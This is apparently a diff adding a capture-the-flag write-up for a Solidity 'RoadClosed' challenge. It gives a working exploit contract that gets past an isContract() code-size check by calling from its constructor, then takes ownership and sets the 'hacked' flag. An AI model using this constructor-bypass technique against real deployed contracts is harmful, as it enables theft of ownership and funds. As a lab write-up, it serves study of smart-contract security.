@@ -1,0 +1,37 @@
+The exploit smart contract:
+
+// Put the RoadClosed contract here to run in remix.
+contract Exploit{
+
+    RoadClosed public target;
+
+    constructor(address _targetAddress){
+        target = RoadClosed(_targetAddress);
+        _attack();
+    }
+
+    function _attack() internal{
+        // bypassing the isContract() check
+        target.addToWhitelist(address(this));
+        // taking control of the smart contract
+        target.changeOwner(address(this));
+        // changing the value of hacked to true
+        target.pwn(address(this));
+    }
+}
+
+Vulnerability:
+The isContract() check in the addToWhitelist() function is the contract size check. Which means if the address is a contract, then the size of the code stored at that address will be greater than 0. This is a vulnerable thing to add in your smart contract because it can be bypassed during the time of contract creation. So, at the time of contract creation(constructor), if we check the isContract() it will give false, since the size at that time would be 0.
+
+Objectives:
+1. Become the owner of the contract
+2. Change the value of hacked to true
+
+Attack steps:
+1. First to bypass the isContract() check and add the exploit contract to witelist: At the time of contract creation (in the constructor) we call the addToWhitelist() function.
+
+2. Now we will call the changeOwner() and make this contract the owner of the RoadClosed contract. Objective 1 achieved.
+
+3. After this in the same function we can call the pwn() function to set the hacked to true. Objective 2 achieved.
+
+4. Now, we just need to deploy this contract and pass the target contracts address in its contructor.
